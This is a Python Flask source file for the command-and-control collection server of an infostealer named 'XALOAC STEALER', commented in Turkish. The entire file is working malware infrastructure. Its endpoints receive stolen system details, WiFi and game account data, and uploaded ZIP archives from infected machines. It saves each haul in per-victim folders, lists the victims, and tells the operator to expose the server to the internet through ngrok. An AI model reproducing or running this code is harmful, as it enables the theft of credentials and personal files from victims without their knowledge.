#!/usr/bin/env python3
"""
XALOAC STEALER - VERI TOPLAMA SUNUCUSU
Kali'de calistir: python server.py
"""

from flask import Flask, request
from flask_cors import CORS
import json
import os
import sys
from datetime import datetime
import base64

app = Flask(__name__)
CORS(app)

SAVE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "victims")

if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

@app.route('/ping', methods=['GET'])
def ping():
    return "OK"

@app.route('/info', methods=['POST'])
def receive_info():
    """Sistem bilgisi, WiFi, oyun hesaplari al"""
    try:
        data = request.get_json()
        ip = request.remote_addr
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        victim_dir = os.path.join(SAVE_DIR, f"{ip}_{timestamp}")
        os.makedirs(victim_dir, exist_ok=True)
        
        with open(os.path.join(victim_dir, "info.json"), "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] YENI KURBAN: {ip}")
        print(f"    Bilgisayar: {data.get('computer', '?')}")
        print(f"    Kullanici: {data.get('user', '?')}")
        print(f"    Kayit: {victim_dir}")
        
        return "OK"
    except Exception as e:
        print(f"[-] Hata: {e}")
        return "ERROR"

@app.route('/upload', methods=['POST'])
def receive_file():
    """ZIP dosyasi al"""
    try:
        file_data = request.data
        ip = request.remote_addr
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = request.headers.get('X-Filename', f'file_{timestamp}.zip')
        
        victim_dir = os.path.join(SAVE_DIR, f"{ip}_{timestamp}")
        os.makedirs(victim_dir, exist_ok=True)
        
        save_path = os.path.join(victim_dir, filename)
        with open(save_path, "wb") as f:
            f.write(file_data)
        
        size_mb = len(file_data) / 1024 / 1024
        print(f"    [+] Dosya alindi: {filename} ({size_mb:.1f} MB)")
        
        return "OK"
    except Exception as e:
        print(f"[-] Hata: {e}")
        return "ERROR"

@app.route('/victims', methods=['GET'])
def list_victims():
    """Kurban listesini goster"""
    victims = []
    if os.path.exists(SAVE_DIR):
        for d in os.listdir(SAVE_DIR):
            path = os.path.join(SAVE_DIR, d)
            if os.path.isdir(path):
                info_file = os.path.join(path, "info.json")
                if os.path.exists(info_file):
                    with open(info_file, "r") as f:
                        data = json.load(f)
                    victims.append({
                        "id": d,
                        "computer": data.get("computer", "?"),
                        "user": data.get("user", "?"),
                        "ip": data.get("ip", "?"),
                        "time": data.get("time", "?")
                    })
    
    return json.dumps(victims, indent=2)

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║              XALOAC STEALER - VERI SUNUCUSU                  ║
    ║              Kurbanlardan veri toplar                        ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    
    print(f"    [*] Sunucu baslatiliyor: http://0.0.0.0:{port}")
    print(f"    [*] Veriler: {SAVE_DIR}")
    print(f"    [*] Kurban listesi: http://localhost:{port}/victims")
    print(f"    [!] Ngrok ile disariya ac: ngrok http {port}")
    print()
    
    app.run(host='0.0.0.0', port=port, debug=False)